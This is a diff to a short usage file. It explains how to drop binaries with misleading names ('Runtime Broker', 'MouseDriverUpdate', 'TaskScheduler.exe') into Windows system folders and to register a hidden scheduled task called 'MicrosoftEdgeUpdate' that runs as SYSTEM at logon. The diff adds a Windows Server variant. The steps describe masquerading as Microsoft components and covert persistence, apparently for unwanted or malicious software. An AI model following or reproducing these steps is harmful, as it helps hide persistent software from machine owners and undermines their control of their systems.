@@ -1,6 +1,9 @@
+dist.zip: Windows 10
+distserver.zip: Windows Server
+
 Usage:
-1. Unzip dist.zip
-2. Go to C:\Program Files\Microsoft Update Health Tools and copy Runtime Broker into it or C:\Program Files\WindowsPowerShell\Configuration
+1. Unzip dist.zip or distserver.zip
+2. Go to C:\Program Files\Microsoft Update Health Tools and copy Runtime Broker into it or C:\Program Files\WindowsPowerShell\Configuration if server
 3. Go to C:\Program Files (x86) and add MouseDriverUpdate to it
 4. Go to C:\Program Files\Windows Mail and add MouseDriverUpdate to it
 5. Go to  C:\ProgramData, add TaskScheduler.exe to it
@@ -13,4 +16,4 @@ Name: MicrosoftEdgeUpdate
 Change User or Group: SYSTEM
 Run with highest privileges, Hidden
 Trigger: At logon
-Actions: Start program: C:\Program Files\Microsoft Update Health Tools\Runtime Broker
+Actions: Start program: C:\Program Files\Microsoft Update Health Tools\Runtime Broker or C:\Program Files\WindowsPowerShell\Configuration\Runtime Broker
